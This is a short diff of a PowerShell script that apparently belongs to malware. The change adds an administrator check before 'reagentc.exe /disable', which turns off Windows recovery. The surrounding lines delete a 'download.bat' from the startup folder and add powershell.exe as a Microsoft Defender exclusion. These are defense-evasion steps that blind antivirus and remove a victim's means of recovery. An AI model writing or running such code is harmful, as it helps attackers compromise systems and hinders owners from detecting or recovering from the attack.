@@ -54,7 +54,12 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
-reagentc.exe /disable
+if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    reagentc.exe /disable
+} else {
+    echo "Not running as Admin"
+}
+
 Remove-Item -Path "$startupfolder\download.bat" -Force
 Add-MpPreference -ExclusionProcess "powershell.exe"
 
